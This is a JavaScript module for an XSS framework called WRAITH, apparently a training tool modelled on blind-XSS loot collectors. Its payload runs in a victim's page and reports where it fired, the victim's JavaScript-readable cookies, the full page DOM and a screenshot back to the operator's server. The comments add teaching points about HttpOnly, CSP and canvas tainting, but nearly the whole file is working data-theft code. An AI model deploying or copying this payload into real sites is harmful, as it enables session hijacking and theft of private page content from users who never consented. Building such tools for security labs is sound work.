// Page Capture module (blind-XSS style loot) -------------------------------
// This is what a blind-XSS framework (XSS Hunter, ezXSS) grabs the instant the
// payload fires in some context you can't see: WHERE it fired (origin + URL +
// referrer), the victim's COOKIES, the full DOM, and a SCREENSHOT.
//
// Teaching beats surfaced in the data:
//   * Cookies here are JS-readable only. HttpOnly cookies are invisible, which
//     is exactly why HttpOnly blunts cookie theft. We label that.
//   * The screenshot uses html2canvas, the same trick the real tools use. It is
//     best-effort: CSP can block loading it, and cross-origin images taint the
//     canvas so it can't be exported. Those failures are the lesson, so we
//     report them honestly instead of hiding them.
//
// Offline labs: drop html2canvas.min.js into public/vendor/ and it loads from
// the WRAITH server (no internet needed). Otherwise it falls back to a CDN.
module.exports = {
  id: 'capture',
  label: 'Page Capture',
  blurb: 'Blind-XSS loot: origin, cookies, DOM, screenshot',
  kind: 'task',

  run: `
  function rep(o){ wraith.report(o); }
  function load(src){
    return new Promise(function(res, rej){
      var s = document.createElement('script');
      s.src = src; s.crossOrigin = 'anonymous';
      s.onload = function(){ res(true); };
      s.onerror = function(){ rej(new Error('load failed: ' + src)); };
      (document.head || document.documentElement).appendChild(s);
    });
  }

  // 1) WHERE the payload fired -- the blind-XSS callback context. Fire this
  // immediately, before waiting on anything: for blind XSS "where did my payload
  // execute?" is the whole question, and it must report even if the page never
  // finishes loading. When auto-fired on hook the hook may sit in <head> with no
  // <body> yet, so the DOM snapshot + screenshot below wait for the document to
  // be ready; this meta ping does not.
  rep({ kind:'meta', origin: location.origin, href: location.href,
        referrer: document.referrer, title: document.title,
        ua: navigator.userAgent, when: Date.now() });

  function grab(){
    // 2) Cookies (non-HttpOnly only -- HttpOnly is invisible to JS by design).
    var cookies = [];
    (document.cookie ? document.cookie.split(';') : []).forEach(function(c){
      var i = c.indexOf('=');
      var name = (i < 0 ? c : c.slice(0, i)).trim();
      var val  = (i < 0 ? ''  : c.slice(i + 1)).trim();
      if (name) cookies.push({ name: name, value: val });
    });
    rep({ kind:'cookies', cookies: cookies });

    // 3) Full DOM (capped so a giant page can't wedge the channel).
    var full = '';
    try { full = document.documentElement.outerHTML || ''; } catch(e){}
    var CAP = 1500000, truncated = false, html = full;
    if (html.length > CAP){ html = html.slice(0, CAP); truncated = true; }
    rep({ kind:'dom', length: full.length, truncated: truncated, html: html });

    // 4) Screenshot via html2canvas (self-hosted first, then CDN).
    var SOURCES = [
      location.origin + '/vendor/html2canvas.min.js',
      'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js'
    ];
    function tryLoad(i){
      if (i >= SOURCES.length) return Promise.reject(new Error('no html2canvas source reachable'));
      return load(SOURCES[i]).catch(function(){ return tryLoad(i + 1); });
    }
    function shoot(){
      return window.html2canvas(document.body || document.documentElement, {
        scale: 0.6, logging: false, useCORS: true, allowTaint: false, backgroundColor: '#ffffff'
      }).then(function(canvas){
        var url = '';
        try { url = canvas.toDataURL('image/jpeg', 0.7); } catch(e){ url = ''; }
        if (url) rep({ kind:'screenshot', dataUrl: url, w: canvas.width, h: canvas.height });
        else     rep({ kind:'info', text:'screenshot canvas tainted by cross-origin images -- not exportable (a CORS lesson)' });
      });
    }

    if (window.html2canvas) return shoot().then(finish, failShot);
    rep({ kind:'info', text:'loading screenshot engine…' });
    tryLoad(0).then(shoot).then(finish, failShot);
    function finish(){ wraith.done({ task:'capture' }); }
    function failShot(e){
      rep({ kind:'info', text:'screenshot unavailable (CSP blocked the script or offline -- self-host html2canvas in public/vendor/)' });
      wraith.done({ task:'capture' });
    }
  }

  // Wait for the DOM so the snapshot + screenshot reflect the rendered page. On a
  // manual click-to-capture the page is already loaded, so this runs immediately;
  // on auto-fire-at-hook it defers a beat until the body exists.
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', grab, { once: true });
  else grab();
  `
};
